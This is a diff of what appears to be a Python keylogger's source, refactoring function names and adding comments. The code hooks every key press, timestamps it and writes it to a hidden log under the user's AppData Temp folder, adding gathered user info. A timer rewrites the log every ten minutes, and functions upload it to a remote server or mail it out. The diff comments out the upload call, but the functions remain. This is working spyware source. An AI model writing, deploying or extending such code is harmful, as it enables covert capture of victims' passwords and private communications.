@@ -10,6 +10,11 @@ import os
 import ssl
 import urllib3
 
+
+# VARIABLES
+
+##############################################################################################
+
 # removes the future warning
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -35,7 +40,12 @@ user_name = psutil.users()[0].name
 path_to_store = rf"C:\Users\{user_name}\AppData\Local\Temp\Scriptz"
 
 
-def GetUserInfo():
+# FUNCTIONS
+
+##############################################################################################
+
+# function to get some info about the user
+def get_user_info():
 
     global user_name
 
@@ -51,7 +61,8 @@ def GetUserInfo():
     return data
 
 
-def SendingDataToServer():
+# function to send keylogger file to a server
+def send_data_to_server():
     
     global server_url
     global user_name
@@ -63,7 +74,8 @@ def SendingDataToServer():
     #print(req.status_code)
 
 
-def SendingDataToEmail():
+# function data send keylogger file to a email address
+def send_data_to_email():
    
     global user_name
     global password
@@ -101,7 +113,9 @@ def SendingDataToEmail():
         return True
 
 
-def SavingData():
+# function to fill and save keylogger file
+# this function will execute repeatly every 10 mins
+def save_file():
 
     global text
     global user_name
@@ -125,18 +139,18 @@ def SavingData():
               #
 
         # CODE TO SEND DATA TO SERVER
-        SendingDataToServer()
+        # send_data_to_server()
 
 
         # CODE TO SEND DATA TO EMAIL
-        # SendingDataToEmail()
+        # send_data_to_email()
 
 
     # emptys text variable for new keys to press
     text = ""
 
-    # creates a new thread and call SavingData every time interval in seconds
-    timer = threading.Timer(timeInterval, SavingData)
+    # creates a new thread and call save_file every time interval in seconds
+    timer = threading.Timer(timeInterval, save_file)
     timer.start()
 
 
@@ -144,19 +158,19 @@ def SavingData():
 if (os.path.isfile(f"{path_to_store}\keylogger_{user_name}.txt") == False):
     os.mkdir(path_to_store)
     file = open(f"{path_to_store}\keylogger_{user_name}.txt", "a")
-    file.write(GetUserInfo().__str__()+"\n\n")
+    file.write(get_user_info().__str__()+"\n\n")
     file.close()
 
 
-# call SavingData to execute internal code and start a new thread
-SavingData()
+# call save_file to execute internal code and start a NEW THREAD
+save_file()
 
 # function that listens key pressed by user
-def onKeyPress(event):  
+def on_key_press(event):  
 
     global text
     text += f"{datetime.now()}: '{event.name}' \n"
     
     
 # create an events for key pressed
-keyboard.on_press(onKeyPress)
+keyboard.on_press(on_key_press)
